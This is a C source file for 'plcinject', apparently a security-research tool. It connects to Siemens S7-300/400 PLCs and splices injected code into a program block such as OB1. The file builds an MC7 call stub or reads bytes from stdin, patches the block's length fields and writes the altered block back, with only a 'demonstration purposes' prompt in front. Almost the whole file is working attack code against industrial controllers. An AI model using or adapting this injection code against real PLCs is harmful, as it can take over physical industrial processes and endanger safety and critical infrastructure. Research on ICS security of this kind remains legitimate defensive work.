//
//	plcinject -- A tool to inject another program into Siemens SIMATIC
//	S7-300/400 PLCs.
//	Copyright (C) 2015  SCADACS (Daniel Marzin, Stephan Lau, Johannes Klick)
//
//	This program is free software: you can redistribute it and/or modify
//	it under the terms of the GNU General Public License as published by
//	the Free Software Foundation, either version 3 of the License, or
//	(at your option) any later version.
//
//	This program is distributed in the hope that it will be useful,
//	but WITHOUT ANY WARRANTY; without even the implied warranty of
//	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//	GNU General Public License for more details.
//
//	You should have received a copy of the GNU General Public License
//	along with this program.  If not, see <http://www.gnu.org/licenses/>.


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

#include <snap7.h>

#define STDIN_BUFFER_SIZE 1024

struct block {
	int32_t block_type;
	int32_t block_no;
};

int downloadAllBlocks(S7Object s7_client, char* path){
	
	DIR* dir;
	struct dirent* ent;
	
	if ((dir = opendir(path)) != NULL) {
		while ((ent = readdir(dir)) != NULL) {
			char filename[1024];
			strncpy(filename, ent->d_name, 1024);
			if (strncmp(filename, ".", 1) == 0) {
				continue;
			}
			
			char* block = filename;
			char* no = NULL;
			
			// filename structure <BLOCK-TYPE>_<block number>.<something>
			for (int i = 0; i < 1024; i++) {
				if (filename[i] == '_') {
					filename[i] = '\0';
					if (filename[i+1] != '\0') {
						no = filename+i+1;
					}
				} else if (filename[i] == '.') {
					filename[i] = '\0';
				}
			}
			
			uint32_t block_no = atoi(no);

			char filepath[2048];
			
			strncpy(filepath, path, 1023);
			strncat(filepath, "/", 1);
			strncat(filepath, ent->d_name, 1024);
			
			FILE* fd = fopen(filepath, "rb");
			if (fd == NULL) {
				return -1;
			}
			
			fseek(fd, 0L, SEEK_END);
			size_t file_length = ftell(fd);
			fseek(fd, 0L, SEEK_SET);
			
			uint8_t* file_content = malloc(sizeof(uint8_t)*file_length);
			
			size_t bytes;
			if ((bytes = fread(file_content, file_length, 1, fd)) != 1){
				free(file_content);
				return -1;
			}
			
			int err = Cli_Download(s7_client, -1, file_content, (int)file_length);
			if (err != 0) {
				char textbuf[1024];
				Cli_ErrorText(err, textbuf, 1024);
				printf("%s%d: %s\n", block, block_no, textbuf);
			}
			
			free(file_content);
		}
	} else {
		return -1;
	}
	return 0;
}

void printUsage(){
	printf("usage: plcinject -c ip [-r rack=0] [-s slot=2] [-b block] [-p block] [-f dir] [-d]\n\n");
	printf("-d\tDisplay available blocks on PLC\n");
	printf("-p\tBlock OBn, FBn or FCn on PLC, e.g. OB1\n");
	printf("-b\tBlock to call\n");
	printf("-f\tPath to additional block\n");
}

void printLicense(){
	printf("plcinject  Copyright (C) 2015  SCADACS (Daniel Marzin, Stephan Lau, Johannes Klick)\nThis program comes with ABSOLUTELY NO WARRANTY.\nThis is free software, and you are welcome to redistribute it\nunder certain conditions.\nFor details check the full license at\nhttp://www.gnu.org/licenses/gpl-3.0.html.\n\n");
}

char ask(){
	printf("This program is for demonstration purposes only.\nYou may only use this program to access your own devices and do not\ncarry out any malicious changes to other devices.\nWe accept no liability in any way.\nDo you agree with that? [y/N]:");
	return getchar();
}

int atoBlock(struct block* blk, char* block) {

	if (strncmp(block, "OB", 2) == 0) {
		blk->block_type = Block_OB;
		blk->block_no = atoi(block+2);
	} else if (strncmp(block, "FB", 2) == 0) {
		blk->block_type = Block_FB;
		blk->block_no = atoi(block+2);
	} else if (strncmp(block, "FC", 2) == 0) {
		blk->block_type = Block_FC;
		blk->block_no = atoi(block+2);
	} else if (strncmp(block, "SFB", 3) == 0) {
		blk->block_type = Block_SFB;
		blk->block_no = atoi(block+3);
	} else if (strncmp(block, "SFC", 3) == 0) {
		blk->block_type = Block_SFC;
		blk->block_no = atoi(block+3);
	} else {
		fprintf(stderr, "Error: Wrong block defined!\n");
		return -1;
	}
	return 0;
}

int main(int argc, char** argv) {

	int arg;
	
	uint8_t data[STDIN_BUFFER_SIZE];
	
	char* ip = NULL;
	int rack = 0;
	int slot = 2;
	char* block = NULL;
	char* patch_block = NULL;
	int display = 0;
	char* path = NULL;
	
	while ((arg = getopt(argc, argv, "hc:r:s:b:df:p:")) != -1) {
		switch (arg) {
			case 'h':
				printUsage();
				return 0;
			case 'c':
				ip = optarg;
				break;
			case 'r':
				rack = atoi(optarg);
				break;
			case 's':
				slot = atoi(optarg);
				break;
			case 'b':
				block = optarg;
				break;
			case 'd':
				display = 1;
				break;
			case 'p':
				patch_block = optarg;
				break;
			case 'f':
				path = optarg;
				break;
			default:
				printUsage();
				return 0;
		}
	}
	printLicense();
	char decission = ask();
	
	switch (decission) {
		case 'y':
		case 'Y':
			break;
		default:
			return 0;
	}
	
	if (ip == NULL) {
		fprintf(stderr, "Error: No ip address specified!\n");
		printUsage();
		return 1;
	}
	
	S7Object s7_client = Cli_Create();

	if (Cli_ConnectTo(s7_client, ip, rack, slot) != 0) {
		fprintf(stderr, "Error: S7Comm connection could not be established!\n");
		return 1;
	}
	
	if (patch_block != NULL) {
		
		struct block patch_blk;
		atoBlock(&patch_blk, patch_block);
		
		size_t length = 0;
		
		if (block != NULL) {
			struct block blk;
			atoBlock(&blk, block);
			
			uint8_t call[] = {
				0xFB, 0x70, 0x00, 0x00,	// CALL FC
				0x70, 0x0B, 0x00, 0x02,	// SPA +2 WORDS
				0xFE, 0x03, 0x00, 0x00, 0x00, 0x00,	// LAR1 P#0.0
				0xFE, 0x0B, 0x00, 0x00, 0x00, 0x00,	// LAR2 P#0.0
				0x30, 0x03, 0x00, 0x00,	// L 0
				0x30, 0x03, 0x00, 0x00,	// L 0
				0x70, 0x07	// T STW
			};
			
			if (blk.block_type == Block_FB) {
				call[1] = 0x72;	// CALL FB
			}
			
			call[3] = (uint8_t)blk.block_no;	// set block number
			call[2] = (uint8_t)(blk.block_no >> 8);
			
			length = sizeof(call);
			
			memcpy(data, &call, length);
			
		} else {
			length = read(STDIN_FILENO, data, STDIN_BUFFER_SIZE);
		}
		
		if (path != NULL) {
			// download all blocks in path
			downloadAllBlocks(s7_client, path);
			
			// patch block by uploading and downloading
			uint8_t content[65536];
			int content_length = sizeof(content);
			Cli_FullUpload(s7_client, patch_blk.block_type, patch_blk.block_no, &content, &content_length);
			
			uint16_t mc7_code_len = (content[34] << 8) | content[35];
			uint8_t* insert = content+36;

			mc7_code_len += length;
			content[34] = (uint8_t)(mc7_code_len >> 8);
			content[35] = (uint8_t)mc7_code_len;
			
			uint16_t block_len = (content[10] << 8) | content[11];
			block_len += length;
			content[10] = (uint8_t)(block_len >> 8);
			content[11] = (uint8_t)block_len;
			
			for (int i = 0; i < content_length-36; i++) {
				content[block_len-1-i] = content[content_length-1-i];
			}
			
			for (int i = 0; i < length; i++) {
				insert[i] = data[i];
			}
		
			int err = Cli_Download(s7_client, patch_blk.block_no, content, block_len);
			if (err != 0) {
				char textbuf[1024];
				Cli_ErrorText(err, textbuf, 1024);
				printf("%s: %s\n", patch_block, textbuf);
			}
		}
		printf("PLC patched!\n");
	}

	if (display == 1) {
		TS7BlocksList blocks_list;
		Cli_ListBlocks(s7_client, &blocks_list);
		
		TS7BlocksOfType blocks;
		int count = 0x2000;
		
		if (blocks_list.DBCount > 0) {
			Cli_ListBlocksOfType(s7_client, Block_DB, &blocks, &count);
			for (int i = 0; i < count; i++) {
				printf("DB%d\n", blocks[i]);
			}
		}
		count = 0x2000;
		if (blocks_list.FBCount > 0) {
			Cli_ListBlocksOfType(s7_client, Block_FB, &blocks, &count);
			for (int i = 0; i < count; i++) {
				printf("FB%d\n", blocks[i]);
			}
		}
		count = 0x2000;
		if (blocks_list.FCCount > 0) {
			Cli_ListBlocksOfType(s7_client, Block_FC, &blocks, &count);
			for (int i = 0; i < count; i++) {
				printf("FC%d\n", blocks[i]);
			}
		}
		count = 0x2000;
		if (blocks_list.OBCount > 0) {
			Cli_ListBlocksOfType(s7_client, Block_OB, &blocks, &count);
			for (int i = 0; i < count; i++) {
				printf("OB%d\n", blocks[i]);
			}
		}
		count = 0x2000;
		if (blocks_list.SDBCount > 0) {
			Cli_ListBlocksOfType(s7_client, Block_SDB, &blocks, &count);
			for (int i = 0; i < count; i++) {
				printf("SDB%d\n", blocks[i]);
			}
		}
	}
	
	Cli_Disconnect(s7_client);
	
    return 0;
}
